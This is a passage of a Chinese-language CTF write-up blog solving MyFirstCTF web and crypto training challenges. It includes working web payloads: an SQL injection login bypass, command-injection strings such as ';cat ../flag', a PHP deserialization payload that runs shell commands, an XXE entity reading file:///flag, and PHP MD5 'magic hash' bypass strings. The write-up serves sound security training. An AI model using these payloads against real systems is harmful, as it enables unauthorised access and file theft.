title="Web"></a>Web</h1><h2 id="Developer-Tools"><a href="#Developer-Tools" class="headerlink" title="Developer Tools"></a>Developer Tools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">資安人員在某公司的網站上發現網站開發人員因為方便開發，而將重要資訊列在前端程式碼中，你能快速的找到這致命的錯誤嗎?</span><br><span class="line"></span><br><span class="line">提示1: MyFirstCTF&#123;xxxxxxxxxxx&#125;</span><br><span class="line">提示2: 你清楚知道base64編碼與解碼的原理嗎?</span><br><span class="line">參看維基百科的說明</span><br><span class="line">https://zh.wikipedia.org/wiki/Base64</span><br><span class="line"></span><br><span class="line">請連結以下網址:</span><br><span class="line">http://140.110.112.29:1001/</span><br></pre></td></tr></table></figure><p>Ctrl + U 或滑鼠右鍵檢視網頁原始碼：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--base64 me --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- TXlGaXJzdENURntTcHpRRGZLMHJxbDE2WlNZd3d3V30= --&gt;</span></span><br></pre></td></tr></table></figure><p>把它丟 Base64 Decoder 就好，請愛用 <a href="https://www.asciitohex.com/" target="_blank" rel="noopener">https://www.asciitohex.com/</a></p><h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">robots.txt是一種文字檔案，它說明網站有哪些檔案及哪些目錄是不希望網路搜尋引擎去爬析。</span><br><span class="line">但駭客卻常透過robots.txt竊取機密資訊。</span><br><span class="line"></span><br><span class="line">提示1 :參看維基百科的解說有助於你的理解: [https://zh.wikipedia.org/wiki/Robots.txt](https://zh.wikipedia.org/wiki/Robots.txt)</span><br><span class="line">提示 2:你應該知道robots.txt存放在網站的放置</span><br><span class="line"></span><br><span class="line">請連結以下網址並完成測試:</span><br><span class="line">[http://140.110.112.29:1002/](http://140.110.112.29:1002/)</span><br></pre></td></tr></table></figure><p>前往 <a href="http://140.110.112.29:1002/robots.txt" target="_blank" rel="noopener">http://140.110.112.29:1002/robots.txt</a><br>發現洩漏 <a href="http://140.110.112.29:1002/admin/" target="_blank" rel="noopener">http://140.110.112.29:1002/admin/</a> ，且可造訪。</p><h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">長期高居OWASP TOP 10第一名的injection flaw是涵蓋許多漏洞的總稱，而其中SQL隱碼攻擊(SQL injection)更是非常著名的網站漏洞，這也是網站安全與威脅的第一堂必修課。</span><br><span class="line"></span><br><span class="line">提示1: 相關說明請參看</span><br><span class="line">[https://www.owasp.org/index.php/Top\_10-2017\_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10)</span><br><span class="line">A1:2017-Injection</span><br><span class="line"></span><br><span class="line">為了證明你已經開始熱情學習資安技術，請你到下列網站並使用SQL injection來找到flag:</span><br><span class="line">http://140.110.112.29:1003/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username = admin&apos;#</span><br><span class="line">Password = admin&apos;#</span><br></pre></td></tr></table></figure><p>成功登入管理員帳號並取得 FLAG</p><h2 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">InsecureTeleCOM公司為增加使用者的忠誠度特提供一系列的網路服務，其中一項便是佈建網站來提供dns線上查詢功能。</span><br><span class="line">為增加其網站安全，InsecureTeleCOM公司委託MyFirstSecurity資安團隊針對其網站進行滲透測試，MyFirstSecurity資深滲透測試專家很快就檢測出該服務具有長期高居OWASP TOP 10第一名的injection flaw。</span><br><span class="line">具有高度資安學習熱情並將以安全專家捍衛家園作為終身職志的志明由於才剛入門，因此嘗試許多SQLi的滲透測試，但卻無所獲。</span><br><span class="line">MyFirstSecurity資深滲透測試專家看到志明的積極與主動，感動之餘便告訴志明有許多injection技術，建議他看看Command injection的漏洞。</span><br><span class="line">志明再度發揮他積極與主動的精神，上網並測試許多類型的OS Command injection，在他詳細的簡報與深度的演講中，已經讓人看到眾所期待的新星正在發光。</span><br><span class="line"></span><br><span class="line">故事講完後 ，就輪到你來努力!請連結以下網址並完成相關測試:</span><br><span class="line">[http://140.110.112.29:1004/](http://140.110.112.29:1004/)</span><br></pre></td></tr></table></figure><p>利用分號進行命令注入，</p><ul><li>;ls -al<ul><li>列出 index 所在資料夾的所有檔案</li></ul></li><li>;cat ../flag<ul><li>成功得到FLAG</li></ul></li></ul><h2 id="Flashing-Redirect"><a href="#Flashing-Redirect" class="headerlink" title="Flashing_Redirect"></a>Flashing_Redirect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">快閃式的重導向(Redirect)總是讓你眼花!</span><br><span class="line"></span><br><span class="line">捉住稍縱即逝的機會是你人生必修課題，參加競賽的你已經踏出第一步!恭喜恭喜!</span><br><span class="line">接著你要學習捉住稍縱即逝的網頁。</span><br><span class="line"></span><br><span class="line">請連結以下網址:</span><br><span class="line">[http://140.110.112.29:1005/](http://140.110.112.29:1005/)</span><br></pre></td></tr></table></figure><p>HTTP 302 之類的吧，跟 AIS3-2017-Web1 一樣。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://140.110.112.29:1005/jump.php</span><br><span class="line">&lt;meta http-equiv="refresh" content="0; url=jump_again.php"&gt;</span><br><span class="line"></span><br><span class="line">curl http://140.110.112.29:1005/jump_again.php</span><br><span class="line">MyFirstCTF&#123;VTmoWAGaiI6kavkN86u0&#125;</span><br><span class="line">恭喜你抓到flag了!!!</span><br></pre></td></tr></table></figure></p><h2 id="New-HTTP-method"><a href="#New-HTTP-method" class="headerlink" title="New HTTP method"></a>New HTTP method</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">你對HTTP狀態碼(HTTP Status Code)及HTTP請求方法(HTTP request methods)了解嗎?熟讀兩者也是資訊安全重要的一環，前者表示該網頁目前的狀態，後者為HTTP協定中定義許多種不同的請求方法，回應的資訊也不同，最常使用的請求方法如GET、POST。</span><br><span class="line">請找出該網站規定了什麼請求方法，從回饋資訊中找出flag。</span><br><span class="line"></span><br><span class="line">提示: Curl tools</span><br><span class="line"></span><br><span class="line">請連結以下網址:</span><br><span class="line">[http://140.110.112.29:1006/](http://140.110.112.29:1006/)</span><br></pre></td></tr></table></figure><p>一點開網頁就是 HTTP 501 Not Implemented，表示說我們用錯 HTTP Method。<br>所以我們可以先用 OPTIONS 這個 Method 來查詢到底有哪些 Method 可以使用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X OPTIONS http://140.110.112.29:1006/index.php</span><br><span class="line"></span><br><span class="line">*   Trying 140.110.112.29...</span><br><span class="line">* Connected to 140.110.112.29 (140.110.112.29) port 1006 (#0)</span><br><span class="line"><span class="meta">&gt;</span> OPTIONS /index.php HTTP/1.1</span><br><span class="line"><span class="meta">&gt;</span> Host: 140.110.112.29:1006</span><br><span class="line"><span class="meta">&gt;</span> User-Agent: curl/7.47.0</span><br><span class="line"><span class="meta">&gt;</span> Accept: */*</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sun, 01 Apr 2018 07:16:37 GMT</span><br><span class="line">&lt; Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">&lt; X-Powered-By: PHP/5.5.9-1ubuntu4.22</span><br><span class="line">&lt; Allow: GiveMeFLAG,OPTIONS</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 140.110.112.29 left intact</span><br></pre></td></tr></table></figure><p>可以看到伺服器可以接收 GiveMeFLAG,OPTIONS 這些 Methond，明顯看出有個 Methond 很奇怪，所以我們試著連上去看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X GiveMeFLAG http://140.110.112.29:1006/index.php</span><br><span class="line"></span><br><span class="line">*   Trying 140.110.112.29...</span><br><span class="line">* Connected to 140.110.112.29 (140.110.112.29) port 1006 (#0)</span><br><span class="line"><span class="meta">&gt;</span> GiveMeFLAG /index.php HTTP/1.1</span><br><span class="line"><span class="meta">&gt;</span> Host: 140.110.112.29:1006</span><br><span class="line"><span class="meta">&gt;</span> User-Agent: curl/7.47.0</span><br><span class="line"><span class="meta">&gt;</span> Accept: */*</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sun, 01 Apr 2018 07:17:37 GMT</span><br><span class="line">&lt; Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">&lt; X-Powered-By: PHP/5.5.9-1ubuntu4.22</span><br><span class="line">&lt; Content-Length: 32</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 140.110.112.29 left intact</span><br><span class="line">MyFirstCTF&#123;VjTUSUqs970RW8sKfTjS&#125;</span><br></pre></td></tr></table></figure><p>成功 GetFLAG。</p><h2 id="GuessingAdminSession"><a href="#GuessingAdminSession" class="headerlink" title="GuessingAdminSession"></a>GuessingAdminSession</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">滲透測試專家在測試InsecurBank的網站系統時，發現用來認證登入的session不夠嚴謹，很容易被猜出session來。證明你有能力善用工具來登入設計不良的網站取得管理者(admin)權限!</span><br><span class="line"></span><br><span class="line">帳號:barry</span><br><span class="line">密碼:barry</span><br><span class="line"></span><br><span class="line">帳號:clara</span><br><span class="line">密碼:clara</span><br><span class="line"></span><br><span class="line">提示1: 你知道如何攔截並修改封包嗎?</span><br><span class="line">提示2: burpsuite會對你有所幫助</span><br><span class="line">提示3: 請嘗試登入admin帳號</span><br><span class="line">提示4: 相關說明請參看</span><br><span class="line">[https://www.owasp.org/index.php/Top\_10-2017\_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10</span><br><span class="line">A2:2017-Broken Authentication</span><br><span class="line"></span><br><span class="line">請連結以下網址進行解題:</span><br><span class="line">[http://140.110.112.29:1007/](http://140.110.112.29:1007/)</span><br></pre></td></tr></table></figure><p>猜謎題(?<br>如果用 barry 登入的話，barry 的 session 是：<br>PZgebJryZaTvNvrFbgsreBYty<br>如果想要以 admin 的身份登入的話，session 就需要是：<br>PZgeaJryZdTvNvmFbgsieBYtn<br>為什麼？因為：<br>XXXXaXXXXdXXXXmXXXXiXXXXn</p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>tplmap</p><h2 id="To-serialize-or-Not-to-serialize"><a href="#To-serialize-or-Not-to-serialize" class="headerlink" title="To serialize or Not to serialize"></a>To serialize or Not to serialize</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php反序列化漏洞，php中有兩個函數serialize()和unserialize()，serialize函數可以將物件轉換成字串，儲存物件的值方便之後的傳遞與使用，unserialize函數能夠將字串轉換回原來的值。</span><br><span class="line"></span><br><span class="line">如當傳給unserialize()的參數可控制時，可以蓄意輸入一個惡意構造的序列化字串，從而控制對象內部的參數甚至是函數造成遠端惡意攻擊。</span><br><span class="line"></span><br><span class="line">請連結以下網址:</span><br><span class="line">http://140.110.112.29:1009/</span><br></pre></td></tr></table></figure><p>PHP反序列化漏洞 + Command inject</p><p>漏洞主要發生原因是使用者可以控制序列化的內容，導致反序列化時在 magic function 內讓我們可以做一些壞壞der事。</p><p>這邊先科普一下重要的 Magic Function：</p><ul><li>__construct()<ul><li>物件被 new 時會自動呼叫，但 unserialize() 時不呼叫</li></ul></li><li>__destruct()<ul><li>物件被銷毀時自動呼叫</li></ul></li><li><code>__wakeup()</code><ul><li>unserialize() 時自動呼叫</li></ul></li><li>__sleep()<ul><li>被 serialize() 時自動呼叫</li></ul></li></ul><p>可以用以下產生 Payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFirstCTF</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $test = <span class="string">";cat T*"</span>; <span class="comment">// command inject</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Wake up yo!&lt;br&gt;"</span>;</span><br><span class="line">system(<span class="string">"echo "</span>.<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> MyFirstCTF());</span><br></pre></td></tr></table></figure></p><p>這邊需要注意不同的變數範圍會有不同的序列化結果</p><ul><li>Public $test<ul><li>O:10:”MyFirstCTF”:1:{s:4:”<code>test</code>“;s:5:”6l0ry”;}</li></ul></li><li>Private $test<ul><li>O:10:”MyFirstCTF”:1:{s:16:”<code>MyFirstCTFtest</code>“;s:5:”6l0ry”;}</li></ul></li><li>Protected $test<ul><li>O:10:”MyFirstCTF”:1:{s:<code>7</code>:”<code>%00*%00test</code>“;s:5:”6l0ry”;}</li></ul></li></ul><p>\x00 是不可視字元，所以記得要 URL encode 上去。不要打 \x00 上去啊！這不是 Binary XDD</p><p>所以最後 Payload 應該要長的像這樣：<br><a href="http://140.110.112.29:1009/index.php?str=O:10:&quot;MyFirstCTF&quot;:1:{s:7:&quot;%00*%00test&quot;;s:7:&quot;;cat%20T*&quot;;}" target="_blank" rel="noopener">http://140.110.112.29:1009/index.php?str=O:10:&quot;MyFirstCTF&quot;:1:{s:7:&quot;%00*%00test&quot;;s:7:&quot;;cat%20T*&quot;;}</a></p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OWASP在2017年提出最新版，其中包含了 A4-XML External Entities(XXE)</span><br><span class="line">詳情請至 : [https://www.owasp.org/index.php/Top\_10-2017\_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10)</span><br><span class="line"></span><br><span class="line">XXE(XML External Entity)漏洞，也被稱為XML外部實體注入攻擊，主要發生在網站解析XML輸入時，沒有禁止外部實體的載入進而造成的安全漏洞。</span><br><span class="line"></span><br><span class="line">請問你是否對XXE已了解?</span><br><span class="line"></span><br><span class="line">觀察完程式碼後，請使用XXE Attack找出flag。</span><br><span class="line"></span><br><span class="line">請連結以下網址:</span><br><span class="line">[http://140.110.112.29:1010/](http://140.110.112.29:1010/)</span><br></pre></td></tr></table></figure><p>NOPE<br>我還不太會解釋，其他人先幫我寫ㄅ，下面給你 Request Body</p><p>Request Body：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /?CTF=Password147186970! HTTP/1.1</span><br><span class="line">Host: 140.110.112.29:1010</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6</span><br><span class="line">Cookie: _ga=GA1.4.265009891.1522486838; _gid=GA1.4.566285874.1522486838; PHPSESSID=PZgebJryZaTvNvrFbgsreBYty</span><br><span class="line">Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE howpwn[</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;MyFirstCTF&gt;&amp;xxe;&lt;/MyFirstCTF&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="凱撒密碼"><a href="#凱撒密碼" class="headerlink" title="凱撒密碼"></a>凱撒密碼</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">凱撒密碼(Caesar cipher)將加密前的字串按照一定的數目向左或向右移動，替換出來的字串就成為密文。這是古典密碼最知名的加密方式也是破密分析第一堂課。</span><br><span class="line"></span><br><span class="line">請破解以下凱薩密碼:</span><br><span class="line">TfMpyzaJAM&#123;QBKqtdsgVWfBypOiwaYk&#125;</span><br><span class="line"></span><br><span class="line">提示1:答案格式 : MyFirstCTF&#123;xxxxxxxxxxx&#125;</span><br><span class="line">提示2:線上資源或是使用python都可以快速解出答案</span><br><span class="line">提示3:嘗試看看brute force解題</span><br></pre></td></tr></table></figure><p>凱薩密碼用窮舉法最好破解，最多只需要破解 25 次即可得到明文。<br><a href="https://planetcalc.com/1434/" target="_blank" rel="noopener">https://planetcalc.com/1434/</a></p><h2 id="Transposition-ciphers"><a href="#Transposition-ciphers" class="headerlink" title="Transposition ciphers"></a>Transposition ciphers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">資安人員在InsecureBank做資安健檢，發現某台電腦存在可疑的程式在深夜固定時間都會送出一些特定封包給特定IP，顯示似乎已遭到駭客植入木馬。在網路封包中經常發現底下附件的通關密語，內容看似亂碼又似乎有規則性，聰明的你能分辯出正確的訊息嗎?</span><br><span class="line"></span><br><span class="line">提示1 : 答案格式 : MyFirstCTF&#123;xxxxxxxxxxx&#125;</span><br><span class="line">提示2 : 答案格式本身就是提示</span><br><span class="line">&lt;br&gt;</span><br><span class="line">題目：</span><br><span class="line">bcvqMeqacytqazFigwiiobxrrrtuiszahftreqcCreqcTreqcFkgd4&#123;bnjrYwgk8OgbceUrwqrkfvbmntewsojklowhmkoHooyfovbnkwii87trfghonakidutfbeghk9co987r5tfbyhjiopo087ttfcvio087tghk9&#125;</span><br></pre></td></tr></table></figure><p>這題其實蠻有趣的，只要眼睛夠尖就可以發現密文有些端倪，<br>你會發現在密文中，每 4 個字元就會出現一個明文字元，<br>依照這種節奏，就可以找出明文字串了。</p><p>這邊有個<a href="http://tholman.com/other/transposition/" target="_blank" rel="noopener">工具</a>可以快速驗證是不是轉置密碼，只是我認為不是最好的工具就是了。 (Proposed Key length = 5)</p><h2 id="XOR-Cipher"><a href="#XOR-Cipher" class="headerlink" title="XOR Cipher"></a>XOR Cipher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">對稱式密碼中常用xor運算，廷廷宣稱他把一支程式用xor加密了，誰都打不開。</span><br><span class="line">你應該可以證明他錯了!</span><br><span class="line"></span><br><span class="line">提示1:你應該清楚xor運算的特色 ，請參看維基百科的說明:https://en.wikipedia.org/wiki/Exclusive_or</span><br><span class="line">當然你可以點選中文解說</span><br><span class="line"></span><br><span class="line">提示2:你必須要先算出解密用的key。</span><br><span class="line"></span><br><span class="line">https://bit.ly/2pXDWsV</span><br></pre></td></tr></table></figure><p>比較少看過把執行檔拿來做 XOR，推薦使用 <a href="https://wiremask.eu/tools/xor-cracker/" target="_blank" rel="noopener">XOR Cracker</a> 解比較快。</p><p>Key Length 是 10、Keys 是 “MyFirstCTF”，把解密檔案下載下來，<br>下載下來後發現是壞掉的執行檔，可以使用 soeasy 題目使用到的技巧把可打印字符串倒出來，<br>然後你就會看到 FLAG 了。</p><p><code>另解</code><br>利用 <code>xortool</code> 找到 key length<br><img src="https://i.imgur.com/OOslepO.png" alt=""><br>之後就可以用 xortool 秒解了<br><img src="https://i.imgur.com/e0u47z6.png" alt=""><br>最後的執行檔<br><img src="https://i.imgur.com/M2QYkQ3.png" alt=""></p><h2 id="HashingService"><a href="#HashingService" class="headerlink" title="HashingService"></a>HashingService</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">維基百科說&quot;雜湊函式(或雜湊演算法，又稱雜湊函式，英語：Hash Function)是一種從任何一種資料中建立小的數字「指紋」的方法。</span><br><span class="line">雜湊函式把訊息或資料壓縮成摘要，使得資料量變小，將資料的格式固定下來。該函式將資料打亂混合，重新建立一個叫做雜湊值（hash values，hash codes，hash sums，或hashes）的指紋。雜湊值通常用一個短的隨機字母和數字組成的字串來代表。好的雜湊函式在輸入域中很少出現雜湊衝突。&quot;</span><br><span class="line"></span><br><span class="line">SHA-1(Secure Hash Algorithm 1)是一種密碼雜湊函式，InsecureTestingCenter設計Sha1Me服務讓你連線測試你所算出的答案。</span><br><span class="line"></span><br><span class="line">請你連線以下位址正確回答問題並取得flag：</span><br><span class="line">nc 10.141.0.210 4112</span><br><span class="line"></span><br><span class="line">提示1:有關hash加密雜湊函數說明，請參看維基百科的說明:</span><br><span class="line">https://en.wikipedia.org/wiki/Hash_function</span><br><span class="line">提示2:python支援SHA-1的套件可以讓你很快解出答案。</span><br><span class="line"></span><br><span class="line">連線範例：</span><br><span class="line">Sha1Me:P3bHzH5pcrGoHF7PGEee</span><br><span class="line">Give me your input:</span><br></pre></td></tr></table></figure><p>老實說這題有點意義不明，就把 “P3bHzH5pcrGoHF7PGEee” 用<a href="http://www.sha1-online.com/" target="_blank" rel="noopener">線上工具</a>作 SHA-1 得到 “d2399fe795d2ba29f4947ac7d0be614c2190bbf3”，然後再 nc 上伺服器把 Hash 過的資料丟給它就好，</p><p>然後它就給你 FLAG 了。</p><p>我還以為要 Hash 100次之類的勒！</p><h2 id="MD5-collision"><a href="#MD5-collision" class="headerlink" title="MD5 collision"></a>MD5 collision</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MD5加密主要是確保資訊完整一致，時常被使用在密碼加密中。但PHP處理MD5時，如使用PHP弱類型比較的程式碼容易產生md5碰撞(md5 collision)。</span><br><span class="line"></span><br><span class="line">請你使用md5 collision原理來登入以下網址取得flag：</span><br><span class="line"></span><br><span class="line">請連結以下網址:</span><br><span class="line">http://10.141.0.210:4113/</span><br><span class="line"></span><br><span class="line">提示1:有關MD5加密雜湊函數，請參看維基百科的說明:</span><br><span class="line">https://en.wikipedia.org/wiki/MD5</span><br><span class="line">提示2:你可以上網看看md5 collision demo</span><br><span class="line">https://www.mathstat.dal.ca/~selinger/md5collision/</span><br><span class="line">&lt;br&gt;</span><br><span class="line">同樣題型不同比賽：http://120.114.62.45:3004/</span><br><span class="line">教育部架設之另一平台，請勿做非法網路攻擊。</span><br><span class="line">網站可能隨時關站，因為這又不是我架的 (´・ω・`)</span><br></pre></td></tr></table></figure><p>PHP 弱類型比較老梗。簡單做個 Demo：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"0e1234"</span> == <span class="string">"0e5678"</span> <span class="comment">// True</span></span><br><span class="line"><span class="string">"0e1234"</span> === <span class="string">"0e5648"</span> <span class="comment">// False</span></span><br><span class="line"><span class="comment">// 兩個等於(相等)與三個等於(全等)的差別</span></span><br><span class="line"><span class="comment">// 相等首先會將被比較的變數強制轉化為比較變數的同一類型，再去比較數值</span></span><br><span class="line"><span class="comment">// 全等首先判斷類型，如果不同直接返回 False，再去比較數值。</span></span><br><span class="line"><span class="comment">// 在進行比較時，如果遇到了 "0e數字數字數字" 這種字串，會將 "0e" 解析成科學符號</span></span><br><span class="line"><span class="comment">// 所以第一個例子會因為兩者皆為 0 而導致返回 True</span></span><br></pre></td></tr></table></figure></p><p>所以這題的解法只要隨便找個字串經過 MD5 後為 0e 開頭的即可繞過登入密碼的限制。<br>以下這些字串都可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MD5(&quot;QNKCDZO&quot;) = 0e830400451993494058024219903391</span><br><span class="line">MD5(&quot;s878926199a&quot;) = 0e545993274517709034328855841020`</span><br><span class="line">MD5(&quot;s155964671a&quot;) = 0e342768416822451524974117254469</span><br></pre></td></tr></table></figure></p><h2 id="SHA1-collision"><a href="#SHA1-collision" class="headerlink" title="SHA1 collision"></a>SHA1 collision</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 